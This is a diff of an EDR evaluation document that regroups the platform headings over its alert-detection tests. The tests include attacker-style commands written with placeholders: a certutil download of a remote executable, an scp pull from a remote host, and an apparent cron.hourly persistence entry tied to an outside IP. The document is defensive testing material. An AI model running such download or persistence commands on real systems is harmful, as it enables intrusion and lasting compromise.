@@ -989,24 +989,8 @@ This section describes any modifications that the <abbr class="dyn-abbr"><a href
                 <p></p>
               </div></div><div class="eacategory">Tests</div><div class="ea"><div class="ea">
                 <p>The evaluator shall perform the following tests:</p>
-                <p>
-                  <b>For Windows,</b>
-                  the evaluator shall test the <abbr class="dyn-abbr"><a href="#abbr_EDR">EDR</a></abbr>'s ability to detect
-                  anomalous activity by performing the following subtests based on the platform of
-                  the enrolled Host Agent's system, verifying for each that, corresponding alerts
-                  were generated in the management dashboard:
-                </p>
-                <p>
-                  <b>For Linux,</b>
-                  the evaluator shall test the <abbr class="dyn-abbr"><a href="#abbr_EDR">EDR</a></abbr>'s ability to detect
-                  anomalous activity by performing the following subtests based on the platform of
-                  the enrolled Host Agent's system, verifying for each that, corresponding alerts
-                  were generated in the management dashboard:
-                </p>
-                <p>
-                  <b>For all platforms:</b>
-                </p>
                 <span class="testlist-"><ul>
+                  <p><b>For Windows,</b> the evaluator shall test the <abbr class="dyn-abbr"><a href="#abbr_EDR">EDR</a></abbr>'s ability to detect anomalous activity by performing the following subtests based on the platform of the enrolled Host Agent's system, verifying for each that, corresponding alerts were generated in the management dashboard:</p>
                   <li class="test-"><a id="_t_1" class="defined" href="#_t_1">Test FAU_ALT_EXT.1:1</a>:
       The evaluator shall open a Windows command prompt as a user and run the command <code>cmd /c certutil -urlcache -split -f &lt;remote file&gt;
                         &lt;download directory&gt;</code>, where the remote file is a valid file path to an accessible, remotely stored executable, and the download directory is a valid directory path writable by the current local user.</li>
@@ -1018,6 +1002,7 @@ This section describes any modifications that the <abbr class="dyn-abbr"><a href
                         executable&gt;" /<abbr class="dyn-abbr"><a href="#abbr_ST">ST</a></abbr> &lt;time&gt;</code>, where the local executable is a valid file path to a readable, local executable, and time is a start time that occurs within minutes of the task being created.</li>
                 </ul></span>
                 <span class="testlist-"><ul>
+                  <p><b>For Linux,</b> the evaluator shall test the <abbr class="dyn-abbr"><a href="#abbr_EDR">EDR</a></abbr>'s ability to detect anomalous activity by performing the following subtests based on the platform of the enrolled Host Agent's system, verifying for each that, corresponding alerts were generated in the management dashboard:</p>
                   <li class="test-"><a id="_t_4" class="defined" href="#_t_4">Test FAU_ALT_EXT.1:4</a>:
       The evaluator shall open a terminal and run the command <code>scp
                       &lt;remote user&gt;@&lt;remote host&gt;:&lt;remote path&gt;
@@ -1028,6 +1013,9 @@ This section describes any modifications that the <abbr class="dyn-abbr"><a href
                       /etc/cron.hourly/persist</code>, where the outside <abbr class="dyn-abbr"><a href="#abbr_IP">IP</a></abbr> is a valid external address.</li>
                 </ul></span>
                 <span class="testlist-"><ul>
+                  <p>
+                    <b>For all platforms:</b>
+                  </p>
                   <li class="test-"><a id="_t_6" class="defined" href="#_t_6">Test FAU_ALT_EXT.1:6</a>:
       The evaluator shall review an alert on the management dashboard and verify that the alert contains a severity field and the fields specified in the <abbr class="dyn-abbr"><a href="#abbr_ST">ST</a></abbr>. The evaluator will open or view the alert and verify that a timeline of events is available for review. The timeline shall show a progression of events over time.</li>
                   <li class="test-"><a id="_t_7" class="defined" href="#_t_7">Test FAU_ALT_EXT.1:7</a>:
